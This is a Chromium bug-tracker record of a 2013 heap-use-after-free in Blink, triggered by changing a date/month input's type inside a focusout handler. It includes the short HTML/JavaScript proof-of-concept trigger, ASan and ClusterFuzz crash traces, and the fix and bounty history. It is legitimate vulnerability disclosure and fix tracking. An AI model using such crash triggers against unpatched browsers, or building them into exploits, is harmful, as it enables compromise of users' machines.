# Heap-use-after-free in WebCore::StyledElement::ensureMutableInlineStyle

| Field | Value |
|-------|-------|
| **Issue ID** | [40077595](https://issues.chromium.org/issues/40077595) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | ks...@chromium.org |
| **Created** | 2013-05-24 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

use-after-free wit input and x-webkit-speech

**VERSION**  

Chrome Version: stable+dev  

Operating System: ubuntu 64bit

**REPRODUCTION CASE**

<html>
<head>
<script>
onload = function() {
el0=document.createElement('input')
document.body.appendChild(el0)
el0.type='month'
el0.focus()
window.addEventListener('focusout', function() { el0.type='date' }, false)
el0.setAttribute('x-webkit-speech')
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

==32687== ERROR: AddressSanitizer: heap-use-after-free on address 0x601600002668 at pc 0x7f5ab36af283 bp 0x7ffffab9a770 sp 0x7ffffab9a768  

READ of size 8 at 0x601600002668 thread T0 (asan-stable)  

#0 0x7f5ab36af282 in get /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/WTF/wtf/RefPtr.h:58:0  

#1 0x7f5ab36af282 in elementData /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/WebCore/dom/Element.h:385:0  

#2 0x7f5ab36af282 in ensureUniqueElementData

0x601600002668 is located 88 bytes inside of 112-byte region [0x601600002610,0x601600002680)  

freed by thread T0 (asan-stable) here:  

#0 0x7f5aaef59b52 in operator delete(void\*) ??:0  

#1 0x7f5ab35288bd in deref /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/WebCore/platform/TreeShared.h:81:0  

#2 0x7f5ab35288bd in derefIfNotNull[WebCore::Node](javascript:void(0);) /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/WTF/wtf/PassRefPtr.h:53:0  

#3 0x7f5ab35288bd in ~RefPtr

## Attachments

- [stable88112.txt](attachments/stable88112.txt) (text/plain; charset=us-ascii, 18.1 KB)
- [88112.html](attachments/88112.html) (text/html; charset=us-ascii, 371 B)
- [88112.txt](attachments/88112.txt) (text/plain; charset=us-ascii, 19.6 KB)

## Timeline

### in...@chromium.org (2013-05-24)

Looks like another BaseMultipleFieldsDateAndTimeInputType issue :(

### in...@chromium.org (2013-05-24)

These input type= bugs inside event handlers seems to be blowing all over the place. Please see if can have some mitigations to kill these. Why did we stop carrying a refptr on these elements ?

    DateTimeEditElement* m_dateTimeEditElement;
    SpinButtonElement* m_spinButtonElement;
    ClearButtonElement* m_clearButton;
    PickerIndicatorElement* m_pickerIndicatorElement;

### in...@chromium.org (2013-05-24)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-05-24)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=186915767

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x60f00001da48
Crash State:
  - crash stack -
  WebCore::StyledElement::ensureMutableInlineStyle
  WebCore::StyledElement::setInlineStyleProperty
  - free stack -
  WebCore::ContainerNode::removeChildren
  WebCore::InputType::destroyShadowSubtree
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=186592:186852

Minimized Testcase (0.31 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv96UkUi2ipsTBjtNDDNY-wYL5aWhrnwtXQm_HmWptMvZA-cbid8ITPktOrZpiEJq8R1lU7TE5O-igPQH5fk7aIn3yLRdu1Cg8NsGvZw0hRvYOe8DinOJYOKSSe1vXhuq2cz1mj3o0mJK_C5p3mBQLTBS5vWF3Q
<script>
      onload = function() {
        el0=document.createElement('input')
        document.body.appendChild(el0)
        el0.type='month'
        el0.focus()
        window.addEventListener('focusout', function() { el0.type='date' }, false)
        el0.setAttribute('x-webkit-speech')
      }
    </script>

### ks...@chromium.org (2013-05-27)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-05-28)

[Empty comment from Monorail migration]

### jl...@chromium.org (2013-05-28)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-05-30)

very friendly ping :)

### ks...@chromium.org (2013-05-31)

Fixed in Blink r151444
http://src.chromium.org/viewvc/blink?view=revision&revision=151444

### sc...@gmail.com (2013-05-31)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-05-31)

ClusterFuzz has detected this issue as fixed in range 203243:203336.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=186915767

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x60f00001da48
Crash State:
  - crash stack -
  WebCore::StyledElement::ensureMutableInlineStyle
  WebCore::StyledElement::setInlineStyleProperty
  - free stack -
  WebCore::ContainerNode::removeChildren
  WebCore::InputType::destroyShadowSubtree
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=186592:186852
Fixed: https://cluster-fuzz.appspot.com/revisions?range=203243:203336

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv96UkUi2ipsTBjtNDDNY-wYL5aWhrnwtXQm_HmWptMvZA-cbid8ITPktOrZpiEJq8R1lU7TE5O-igPQH5fk7aIn3yLRdu1Cg8NsGvZw0hRvYOe8DinOJYOKSSe1vXhuq2cz1mj3o0mJK_C5p3mBQLTBS5vWF3Q

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sc...@gmail.com (2013-06-07)

M28: r152057

### pa...@chromium.org (2013-06-27)

$1000 for this one!

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties.
*********************************

### sc...@gmail.com (2013-07-03)

[Empty comment from Monorail migration]

### pa...@chromium.org (2013-08-20)

[Empty comment from Monorail migration]

### js...@chromium.org (2013-11-18)

Bulk release of old security bug reports.


### ti...@chromium.org (2014-02-28)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-02-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/243818?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40077595)*
